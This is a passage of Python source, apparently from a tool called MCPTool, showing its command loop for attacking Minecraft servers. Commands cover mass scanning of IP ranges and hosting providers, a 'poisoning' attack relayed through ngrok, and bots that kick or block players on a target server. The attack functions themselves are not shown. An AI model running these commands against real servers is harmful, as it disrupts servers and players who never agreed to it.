        print(f"     {lblack}[{lred}Play{white}ers{lblack}] {white}{response.players.online}{lblack}/{white}{response.players.max}")

        if response.players.sample is not None:
            if players != "":
                print(f"     {lblack}[{lred}Nam{white}es{lblack}] {white}{players}")

    except KeyboardInterrupt:
        pass

    except TimeoutError:
        print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}Enter a valid server.")

    except socket.gaierror:
        print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}Enter a valid server.")

    except ConnectionRefusedError:
        print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}Enter a valid server. (Possible bedrock server)")

    except Exception as e:
        if DEBUG:
            print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}DEBUG: \n {e} {traceback.format_exc()}")

        pass


def player_command(nick):
    """ Player command """
    try:
        r = requests.get(f"{mojang_api}{nick}")
        r_json = r.json()
        player_uuid = r_json["id"]
        player_uuid_ = f"{player_uuid[0:8]}-{player_uuid[8:12]}-{player_uuid[12:16]}-{player_uuid[16:21]}-{player_uuid[21:32]}"

        offline_player_uuid = str(uuid.UUID(bytes=hashlib.md5(bytes(f"OfflinePlayer:{nick}", "utf-8")).digest()[:16], version=3))
        offline_player_uuid_ = offline_player_uuid.replace("-", "")

        print(f"\n{lblack}     [{lred}UU{white}ID{lblack}] {white}{player_uuid_}")
        print(f"{lblack}     [{lred}UU{white}ID{lblack}] {white}{player_uuid}\n")
        print(f"{lblack}     [{lred}UUID{white} Offline{lblack}] {white}{offline_player_uuid}")
        print(f"{lblack}     [{lred}UUID{white} Offline{lblack}] {white}{offline_player_uuid_}")

    except KeyboardInterrupt:
        pass

    except JSONDecodeError:
        offline_player_uuid = str(uuid.UUID(bytes=hashlib.md5(bytes(f"OfflinePlayer:{nick}", "utf-8")).digest()[:16], version=3))
        offline_player_uuid_ = offline_player_uuid.replace("-", "")
        print(f"\n{lblack}     [{lred}UUID{white} Offline{lblack}] {white}{offline_player_uuid}")
        print(f"{lblack}     [{lred}UUID{white} Offline{lblack}] {white}{offline_player_uuid_}")

    except requests.exceptions.ConnectionError:
        print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}Connection error.")

    except Exception as e:
        if DEBUG:
            print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}DEBUG: \n {e} {traceback.format_exc()}")

        offline_player_uuid = str(uuid.UUID(bytes=hashlib.md5(bytes(f"OfflinePlayer:{nick}", "utf-8")).digest()[:16], version=3))
        offline_player_uuid_ = offline_player_uuid.replace("-", "")
        print(f"\n{lblack}     [{lred}UUID{white} Offline{lblack}] {white}{offline_player_uuid}")
        print(f"{lblack}     [{lred}UUID{white} Offline{lblack}] {white}{offline_player_uuid_}")


def main():
    """ Main """
    global number_of_servers, sfile, DEBUG

    argument = input().split()

    if len(argument) == 0:
        print(f"\n     {lblack}[{red}-{lblack}] {lred}Unknown command. Type help to see the available commands.")

    try:
        sfile = False
        command = argument[0]

        if command.lower() == "help":
            print(help_message)

        elif command.lower() == "cls" or command.lower() == "clear":
            os.system("cls || clear")
            print(banner)

        elif command.lower() == "server" or command.lower() == "srv":
            try:
                server = argument[1]
                server_command(server)

            except IndexError:
                print(f"\n{white}     Usage: {command.lower()} [domain] or [ip:port]")

            except Exception as e:
                if DEBUG:
                    print(f"     [DEBUG] Exception (Server): {e} \n\n{traceback.format_exc()}")

        elif command.lower() == "player":
            try:
                nick = argument[1]
                player_command(nick)

            except IndexError:
                print(f"\n{white}     Usage: player [name]")

            except Exception as e:
                if DEBUG:
                    print(f"     [DEBUG] Exception (Player): {e} \n\n{traceback.format_exc()} ")

        elif command.lower() == "scan":
            try:
                target = argument[1]
                ports = argument[2]
                check__nmap = check_nmap()

                if check__nmap:
                    skip = skip_0on()
                    check__node = check_node()
                    if check__node:
                        bot_check()

                    if DEBUG:
                        print("\n     DEBUG: \n\n")
                        time.sleep(1)
                        print(f"{os.path.abspath(os.getcwd())}\n\n \n\n{os.system('dir')}\n\n {os.system('npm --version')}\n     Waiting 10 seconds..")
                        time.sleep(10)

                    number_of_servers = 0
                    nmap_scan("scan", target, ports, skip, None)
                    print(f"\n{white}     {lblack}[{lred}FINI{white}SHED{lblack}] {white}The scan finished and found {number_of_servers} servers")

            except IndexError:
                print(f"\n{white}     Usage: scan [ip] [ports]")

            except Exception as e:
                if DEBUG:
                    print(f"     [DEBUG] Exception (Scan): {e} \n\n{traceback.format_exc()}")

        elif command.lower() == "host":
            try:
                host = argument[1].lower()
                ports = argument[2]
                check__nmap = check_nmap()

                if check__nmap:
                    if host in host_list:
                        skip = skip_0on()
                        check__node = check_node()
                        if check__node:
                            bot_check()

                        number_of_servers = 0
                        host_command(host, ports, skip)
                        print(f"\n{white}     {lblack}[{lred}FINI{white}SHED{lblack}] {white}The scan finished and found {number_of_servers} servers")

                    else:
                        print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}Host not found! \n     {white}Available hosts (minehost, holyhosting, vultam){reset}")

            except IndexError:
                print(f"\n{white}     Usage: host [host] [ports]")

            except Exception as e:
                if DEBUG:
                    print(f"     [DEBUG] Exception (Host): {e} \n\n{traceback.format_exc()}")

        elif command.lower() == "qubo":
            try:
                target = argument[1]
                ports = argument[2]
                threads = argument[3]
                timeout = argument[4]
                check__java = check_java()

                if check__java:
                    check__qubo = check_qubo(threads, timeout)
                    if check__qubo:
                        skip = skip_0on()
                        check__node = check_node()
                        if check__node:
                            bot_check()

                        number_of_servers = 0
                        qubo_command(target, ports, threads, timeout, skip)
                        print(f"\n{white}     {lblack}[{lred}FINI{white}SHED{lblack}] {white}The scan finished and found {number_of_servers} servers")

            except IndexError:
                print(f"\n{white}     Usage: qubo [ip] [ports] [threads] [timeout]")

            except Exception as e:
                if DEBUG:
                    print(f"     [DEBUG] Exception (Qubo): {e} \n\n{traceback.format_exc()}")

        elif command.lower() == "sfile":
            try:
                file = argument[1]
                ports = argument[2]
                check__nmap = check_nmap()

                if check__nmap:
                    skip = skip_0on()
                    check__node = check_node()
                    if check__node:
                        bot_check()

                    iplist_ = iplist(file)
                    if iplist_[0]:
                        number_of_servers = 0
                        for ip in iplist_[1]:
                            nmap_scan("scan", ip, ports, skip, None)
                            sfile = True

                        print(f"\n{white}     {lblack}[{lred}FINI{white}SHED{lblack}] {white}The scan finished and found {number_of_servers} servers")

            except IndexError:
                print(f"\n{white}     Usage: sfile [file] [ports]")

            except Exception as e:
                if DEBUG:
                    print(f"     [DEBUG] Exception (SFile): {e} \n\n{traceback.format_exc()}")

        elif command.lower() == "mods":
            try:
                target = argument[1]
                check__server = check_server(target)

                if check__server:
                    mods_command(target)

            except IndexError:
                print(f"\n{white}     Usage: mods [ip:port]")

            except Exception as e:
                if DEBUG:
                    print(f"     [DEBUG] Exception (Mods): {e} \n\n{traceback.format_exc()}")

        elif command.lower() == "listening":
            try:
                target = argument[1]
                check__server = check_server(target)

                if check__server:
                    listening_command(target)

            except IndexError:
                print(f"\n{white}     Usage: listening [ip:port]")

            except Exception as e:
                if DEBUG:
                    print(f"     [DEBUG] Exception (Qubo): {e} \n\n{traceback.format_exc()}")

        elif command.lower() == "checker":
            try:
                file = argument[1]
                check__nmap = check_nmap()

                if check__nmap:
                    skip = skip_0on()
                    check__node = check_node()
                    if check__node:
                        bot_check()

                    number_of_servers = 0
                    checker_command(file, skip)
                    print(f"\n{white}     {lblack}[{lred}FINI{white}SHED{lblack}] {white}The scan finished and found {number_of_servers} servers")

            except IndexError:
                print(f"\n{white}     Usage: checker [file]")

            except Exception as e:
                if DEBUG:
                    print(f"     [DEBUG] Exception (Checker): {e} \n\n{traceback.format_exc()}")

        elif command.lower() == "bungee":
            try:
                target = argument[1]
                check__java = check_java()

                if check__java:
                    bungee_command(target)

            except IndexError:
                print(f"\n{white}     Usage: bungee [ip:port]")

            except Exception as e:
                if DEBUG:
                    print(f"     [DEBUG] Exception (Bungee): {e} \n\n{traceback.format_exc()}")

        elif command.lower() == "poisoning" or command.lower() == "poisoning":
            try:
                target = argument[1]
                port = argument[2]
                check__java = check_java()

                if check__java:
                    check__ngrok = check_ngrok(port)
                    if check__ngrok[0]:
                        check__server = check_server(target)
                        if check__server:
                            check__port = check_port(port)
                            if check__port:
                                poisoning_command(target, port, check__ngrok[1])

            except IndexError:
                print(f"\n{white}     Usage: poisoning [ip:port] [local-port]")

            except Exception as e:
                if DEBUG:
                    print(f"     [DEBUG] Exception (Poisoning): {e} \n\n{traceback.format_exc()}")

        elif command.lower() == "bot" or command.lower() == "connect":
            try:
                target = argument[1]
                check__node = check_node()

                if check__node:
                    check__server = check_server(target)
                    if check__server:
                        get__port = get_port(target)
                        version = specific_version()
                        name = specific_name()

                        if ":" in target:
                            target = target.split(":")
                            target = target[0]

                        connect("connect", target, get__port, version, name)
                        os.system("cls || clear")
                        print(banner)

            except IndexError:
                print(f"\n{white}     Usage: bot [server]")

            except KeyboardInterrupt:
                print(f"\n{lblack}[{lred}CTRL{white}-C{lblack}] {white}Stopping..")
                time.sleep(2)
                os.system("cls || clear")
                print(banner)

            except Exception as e:
                if DEBUG:
                    print(f"     [DEBUG] Exception (Bot): {e} \n\n{traceback.format_exc()}")

        elif command.lower() == "kick":
            try:
                target = argument[1]
                version = argument[2]
                name = argument[3]
                check__node = check_node()

                if check__node:
                    check__server = check_server(target)
                    if check__server:
                        get__port = get_port(target)

                        if ":" in target:
                            target = target.split(":")
                            target = target[0]

                        connect("kick", target, get__port, version, name)

            except IndexError:
                print(f"\n{white}     Usage: kick [ip:port] [version] [name]")

            except KeyboardInterrupt:
                print(f"\n{lblack}[{lred}CTRL{white}-C{lblack}] {white}Stopping..")

            except Exception as e:
                if DEBUG:
                    print(f"     [DEBUG] Exception (Kick): {e} \n\n{traceback.format_exc()}")

        elif command.lower() == "kickall":
            try:
                target = argument[1]
                version = argument[2]
                check__node = check_node()

                if check__node:
                    check__server = check_server(target)
                    if check__server:
                        get__port = get_port(target)

                        if ":" in target:
                            target = target.split(":")
                            target = target[0]

                        connect("kickall", target, get__port, version, None)

            except IndexError:
                print(f"\n{white}     Usage: kickall [ip:port] [version]")

            except KeyboardInterrupt:
                print(f"\n{lblack}[{lred}CTRL{white}-C{lblack}] {white}Stopping..")

            except Exception as e:
                if DEBUG:
                    print(f"     [DEBUG] Exception (Kickall): {e} \n\n{traceback.format_exc()}")

        elif command.lower() == "block":
            try:
                target = argument[1]
                version = argument[2]
                name = argument[3]
                check__node = check_node()

                if check__node:
                    check__server = check_server(target)
                    if check__server:
                        get__port = get_port(target)

                        if ":" in target:
                            target = target.split(":")
                            target = target[0]

                        connect("block", target, get__port, version, name)

            except IndexError:
                print(f"\n{white}     Usage: block [ip:port] [version] [name]")

            except KeyboardInterrupt:
                print(f"\n{lblack}[{lred}CTRL{white}-C{lblack}] {white}Stopping..")

            except Exception as e:
                if DEBUG:
                    print(f"     [DEBUG] Exception (Block): {e} \n\n{traceback.format_exc()}")

        elif command.lower() == "discord" or command.lower() == "ds":
            print(f"\n     {white}My Discord server: {lcyan}{discord_link}{reset}")

        elif command.lower() == "debug":
            if DEBUG:
                DEBUG = False
                print(f"\n     {white}DEBUG: {lred}Disabled")

            else:
                DEBUG = True
                print(f"\n     {white}DEBUG: {lgreen}Enabled")

        else:
            print(f"\n     {lblack}[{red}-{lblack}] {lred}Unknown command. Type help to see the available commands.")

    except KeyboardInterrupt:
        print(f"\n     {lblack}[{lred}CTRL{white}-C{lblack}] {white}Stopping..")

    except:
        pass


if __name__ == "__main__":
    if not SKIP_LOAD:
        load()

    if os.name == "nt":
        os.system("cls & title MCPTool")

    else:
        os.system("clear")

    print(banner)
    while True:
        if os.name == "nt":
            py = "python"
            print(f"\n {reset}{red}    root@windows:~/MCPTool# {lblack}» {white} ", end="")
            main()

        else:
            os.system("clear")
            py = "python3"
            print(f"\n {reset}{red}    root@linux:~/MCPTool# {lblack}» {white} ", end="")
            main()
